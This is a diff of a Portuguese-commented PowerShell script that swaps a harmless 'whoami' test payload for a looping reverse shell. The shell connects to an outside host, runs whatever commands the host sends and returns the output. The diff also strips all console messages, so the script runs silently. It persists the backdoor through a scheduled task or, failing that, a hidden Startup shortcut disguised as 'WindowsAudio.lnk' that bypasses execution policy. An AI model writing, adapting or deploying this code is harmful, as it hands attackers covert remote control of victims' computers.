@@ -14,9 +14,7 @@ $TempDir = "$env:TEMP\Windows\TempLogs"
 
 # 2. Payload simples para teste
 $Payload = @'
-# Teste simples
-$output = whoami
-$output | Out-File "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache\test.log" -Append
+$e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',2489);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
 '@
 
 # 3. Script ofuscado (corrigido)
@@ -46,16 +44,10 @@ try {
     # Registrar tarefa
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description $TaskDescription -Force -ErrorAction Stop
     
-    Write-Host "Tarefa criada com sucesso!" -ForegroundColor Green
-    
     # Testar execução imediata (opcional)
     Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    Write-Host "Tarefa iniciada para teste" -ForegroundColor Yellow
     
 } catch {
-    Write-Host "Erro ao criar tarefa: $_" -ForegroundColor Red
-    Write-Host "Criando atalho na inicialização..." -ForegroundColor Yellow
-    
     # Fallback para inicialização do usuário
     $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     $ShortcutPath = "$StartupPath\WindowsAudio.lnk"
@@ -66,18 +58,4 @@ try {
     $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 60; if (Test-Path '$ScriptPath') { `$c=Get-Content '$ScriptPath' -Raw; if (`$c -match '^# Encoded script') { iex `$c } }`""
     $Shortcut.WindowStyle = 7
     $Shortcut.Save()
-    
-    Write-Host "Atalho criado: $ShortcutPath" -ForegroundColor Green
 }
-
-# 5. Verificar criação
-Write-Host "`nVerificando criação:" -ForegroundColor Cyan
-Write-Host "Script salvo em: $ScriptPath"
-Write-Host "Tarefa: $TaskName"
-Write-Host "`nPara testar manualmente: Get-ScheduledTask -TaskName '$TaskName' | Start-ScheduledTask" -ForegroundColor Yellow
-
-# Não auto-excluir para debug
-# $currentPath = $MyInvocation.MyCommand.Path
-# if (Test-Path $currentPath) {
-#     Write-Host "O script original será mantido para debug" -ForegroundColor Magenta
-# }
